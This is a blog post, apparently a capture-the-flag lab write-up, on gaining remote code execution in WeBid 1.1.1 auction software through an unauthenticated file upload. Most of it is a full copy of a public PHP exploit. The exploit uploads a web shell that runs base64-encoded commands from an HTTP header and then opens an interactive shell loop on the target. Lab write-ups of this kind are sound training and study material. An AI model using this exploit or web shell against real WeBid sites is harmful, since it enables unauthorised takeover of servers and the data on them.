---
layout: post
title: AttackDefense.com [RCE] - WeBid
date: 2018-12-01 17:41 -0300
categories: [AttackDefense.com, ctf, writeups, RCE]
tags: [ writeups, CTF,  challange, AttackDefense.com]
---

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-26 17-44-27.png)

### Mission

The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.

In the exercise below, the attacker is unauthenticated to the web application and needs to find a remote code injection attack to run arbitrary commands on the server.

A version of WeBid is vulnerable to a remote code execution attack.

Objective: Your task is to find and exploit this vulnerability.

Level difficulty: Easy

Category: Real Web Applications > Remote Code Execution

### Solution

WeBid provides open source auction software which has been used around the world and has been downloaded over 100,000 times and allows consumers to quickly set up their own auction site and get started straight away.

Unfortunately, in this lab, I was provided with a rather old version of WeBid that has a Remote Code Execution Vulnerability using an unrestricted file upload.

![Image of AttackDefense 2018](/uploads/adrce5/image8.png)

By going to the following link, I was able to retrieve the exact version of this PHP application:

- [http://2e6goc7ffrfcmawrhu6u2r6n4.public2.attackdefenselabs.com/docs/changes.txt](http://2e6goc7ffrfcmawrhu6u2r6n4.public2.attackdefenselabs.com/docs/changes.txt)

![Image of AttackDefense 2018](/uploads/adrce5/image7.png)

Funny enough this version of WeBid (1.1.1) is so broken, that the well known ```@GetSploitBot``` telegram bot cannot list all the exploits for all the existing vulnerabilities:

![Image of AttackDefense 2018](/uploads/adrce5/image5.png)

I decided to use an Unrestricted File Upload Exploit in order to obtain a Remote Code Execution Vulnerability. Here is the example PHP exploit that I used in order to obtain an interactive web shell:

- [https://vulners.com/zdt/1337DAY-ID-23323](https://vulners.com/zdt/1337DAY-ID-23323
)

![Image of AttackDefense 2018](/uploads/adrce5/image6.png)

Here is an exact copy of the known PHP exploit:

```php
<?php
   
/*
   
  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /      
  / XXXXXX /
 (________(        
  `------'
    
 Exploit Title   : WeBid 1.1.1 Unrestricted File Upload Exploit
 Date            : 20 February 2015
 Exploit Author  : CWH Underground
 Site            : www.2600.in.th
 Vendor Homepage : http://www.webidsupport.com/
 Software Link   : http://sourceforge.net/projects/simpleauction/files/simpleauction/WeBid%20v1.1.1/WeBid-1.1.1.zip/download
 Version         : 1.1.1
 Tested on       : Window and Linux
    
    
#####################################################
VULNERABILITY: Arbitrary File Upload Vulnerability
#####################################################
    
/ajax.php
/inc/plupload/examples/upload.php
   
#####################################################
DESCRIPTION
#####################################################
    
This exploit a file upload vulnerability found in WeBid 1.1.1, and possibly prior. Attackers can abuse the
upload feature in order to upload a malicious PHP file without authentication, which results in arbitrary remote code execution.
   
#####################################################
EXPLOIT
#####################################################
    
*/
   
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
   
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
    
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
   
print "\n+----------------------------------------+";
print "\n| WeBid Unrestricted File Upload Exploit |";
print "\n+----------------------------------------+\n";
    
if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path>\n";
    print "\nExample....: php $argv[0] localhost /";
    print "\nExample....: php $argv[0] localhost /WeBid/\n";
    die();
}
   
$host = $argv[1];
$path = $argv[2];
    
$payload  = "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"name\"\r\n\r\n";
$payload .= "shell.php\r\n";
$payload .= "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n";
$payload .= "Content-Type: application/octet-stream\r\n\r\n";
$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
$payload .= "--o0oOo0o--\r\n";
 
$packet  = "POST {$path}ajax.php?do=uploadaucimages HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
$packet .= "Cookie: PHPSESSID=cwh"."\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
 
print "\n\nExploiting...";
sleep(2);
print "Waiting for shell...\n";
sleep(2);
 
http_send($host, $packet);
   
$packet  = "GET {$path}uploaded/cwh/shell.php HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";
 
   print "\n  ,--^----------,--------,-----,-------^--,   \n";
   print "  | |||||||||   `--------'     |          O   \n";
   print "  `+---------------------------^----------|   \n";
   print "    `\_,-------, _________________________|   \n";
   print "      / XXXXXX /`|     /                      \n";
   print "     / XXXXXX /  `\   /                       \n";
   print "    / XXXXXX /\______(                        \n";
   print "   / XXXXXX /                                 \n";
   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
   print " (________(                                   \n";
   print "  `------'                                    \n";
       
while(1)
{
    print "\nWebid-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}
 
################################################################################################################
# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
?>

#  0day.today [2018-02-10]  #

```

Example usage of the exploit on my localhost:

![Image of AttackDefense 2018](/uploads/adrce5/image3.png)

Running the exploit against the given target and obtaining the interactive shell:

![Image of AttackDefense 2018](/uploads/adrce5/image4.png)

Proof of remote code execution and final access:

![Image of AttackDefense 2018](/uploads/adrce5/image1.png)

![Image of AttackDefense 2018](/uploads/adrce5/image2.png)